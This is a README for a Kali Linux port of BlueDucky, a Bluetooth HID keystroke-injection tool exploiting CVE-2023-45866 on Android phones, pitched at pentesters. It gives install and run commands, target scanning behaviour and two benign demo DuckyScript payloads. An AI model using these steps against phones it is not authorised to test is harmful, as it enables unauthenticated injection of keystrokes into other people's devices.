BlueDucky (Android) 🦆
Ported & Optimized for Kali Linux by Ekoahamdutivnasti

Visit us: 🌐 https://ekoahamdutivnasti.com

🔹 Credits to the original contributors:

saad0x1 on GitHub

spicydll on GitHub

<p align="center"> <img src="./images/duckmenu.png"> </p>
🚨 CVE-2023-45866 Exploitation via DuckyScript
🔓 Unauthenticated Bluetooth Peering → Remote Code Execution (HID Emulation)

This tool is based on the vulnerability reported by Marc Newlin under CVE-2023-45866.

⚠️ This version has been ported and optimized specifically for Kali Linux by Ekoahamdutivnasti, to ensure better stability and seamless integration in pentesting environments.

<p align="center"> <img src="./images/BlueDucky.gif"> </p>
🧠 What is BlueDucky?
BlueDucky is a Bluetooth HID injection tool that allows you to:

📡 Reconnect with previously paired Bluetooth devices (even if not visible).

📂 Auto-save and reuse scanned devices.

💌 Execute HID keystroke payloads via DuckyScript.

✅ Tested and stable on Raspberry Pi 4
✅ Verified against multiple Android phones
⚠️ Note: Vodafone NZ brand may behave differently

🔧 Installation on Kali Linux
1️⃣ Update your system
bash
Copy
Edit
sudo apt-get update && sudo apt-get -y upgrade
2️⃣ Install dependencies
bash
Copy
Edit
sudo apt install -y bluez-tools bluez-hcidump libbluetooth-dev \
                    git gcc python3-pip python3-setuptools \
                    python3-pydbus
3️⃣ Install pybluez from source
bash
Copy
Edit
git clone https://github.com/pybluez/pybluez.git
cd pybluez
sudo python3 setup.py install
4️⃣ Build bdaddr utility
bash
Copy
Edit
cd ~/
git clone --depth=1 https://github.com/bluez/bluez.git
gcc -o bdaddr ~/bluez/tools/bdaddr.c ~/bluez/src/oui.c -I ~/bluez -lbluetooth
sudo cp bdaddr /usr/local/bin/
▶️ How to Run BlueDucky
bash
Copy
Edit
git clone https://github.com/pentestfunctions/BlueDucky.git
cd BlueDucky
sudo hciconfig hci0 up
python3 BlueDucky.py
⚙️ How It Works
You’ll be prompted for a target MAC address.

Leave it blank to start auto-scanning.

Discovered devices are stored in known_devices.txt.

If that file exists, it’s used as a device cache.

The script then runs instructions from payload.txt.

On success, it auto-connects and executes keystrokes.

💻 DuckyScript Payload Examples
🧪 Still under development — suggestions welcome!

📜 Basic Input Demo
bash
Copy
Edit
REM Type a string
STRING ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890!@#$%^&*()_-=+\|[{]};:'",<.>/?
GUI D
🧭 Launch Private Mode to hackertyper.net
bash
Copy
Edit
REM Open hackertyper.net in incognito
DELAY 200
ESCAPE
GUI d
ALT ESCAPE
GUI b
DELAY 700
PRIVATE_BROWSER
DELAY 700
CTRL l
DELAY 300
STRING hackertyper.net
DELAY 300
ENTER
DELAY 300
🛡️ Notes from Ekoahamdutivnasti
✅ Stable & fully optimized for Kali Linux

🧠 Ideal for pentesters and researchers

🐧 Works great on Kali 2023.x, Raspberry Pi, and similar platforms

🌐 Stay Connected
👨‍💻 Ported and maintained for Kali by Ekoahamdutivnasti
🔗 Visit us: https://ekoahamdutivnasti.com

